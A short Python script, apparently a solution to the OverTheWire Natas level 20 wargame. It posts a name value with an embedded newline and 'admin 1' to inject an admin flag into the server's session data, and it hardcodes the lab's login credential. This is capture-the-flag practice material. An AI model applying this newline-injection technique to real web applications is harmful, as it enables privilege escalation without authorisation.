# -*- coding:utf8 -*-

import requests

url = "http://natas20.natas.labs.overthewire.org/index.php?debug=true&name="
auth = ("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF")
inj = "lol%5Cnadmin 1"

data = { "name" : "lol\nadmin 1"}

r = requests.post(url, auth=auth, data=data)
print(r.text)
